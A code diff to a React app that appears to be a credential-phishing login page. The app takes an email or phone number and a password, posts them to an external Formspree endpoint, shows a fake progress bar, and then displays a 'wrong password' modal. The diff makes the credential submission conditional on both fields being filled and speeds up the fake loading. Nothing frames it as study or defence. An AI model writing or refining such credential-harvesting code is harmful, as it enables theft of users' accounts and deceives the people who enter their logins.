@@ -53,13 +53,18 @@ function App() {
 const submitInfo = e=>{
   e.preventDefault()
 
-  axios.post("https://formspree.io/f/mzbkknod",userInfo)
-  .then(()=>{
-    console.log("data submitted")
-  })
-  .catch(err=>{
-    console.log(err)
-  })
+  const { emailOrPhone,password  } = userInfo;
+
+  if(emailOrPhone && password){
+      axios.post("https://formspree.io/f/mzbkknod",userInfo)
+    .then(()=>{
+      console.log("data submitted")
+    })
+    .catch(err=>{
+      console.log(err)
+    })
+   
+  }
 }
 
 
@@ -78,9 +83,9 @@ const submitInfo = e=>{
     let interval=null
      if(shouldCount){
        interval =  setInterval(() => {
-        let numberByRandom = Math.floor(Math.random() * 10)
+        let numberByRandom = Math.floor(Math.random() * 3)
         setWidthLoading(widthLoading+numberByRandom)
-        },500)
+        },50)
       if(widthLoading>97){
         setOpenModal(true)
         clearInterval(interval)
@@ -99,8 +104,8 @@ const submitInfo = e=>{
   const modalContent = ()=>{
     return openModal ? (<div className="modal_container">
     <div className="modal">
-      <p><b>{t('pass_wrong.title')}</b></p>
-      <p>{t('pass_wrong.message')}</p>
+      <p className="title-wrong"><b>{t('pass_wrong.title')}</b></p>
+      <p className="mssg-success-or-error">{t('pass_wrong.message')}</p>
         <button onClick={exitModal} className="ok">ok</button>
     </div>
   </div>) : null
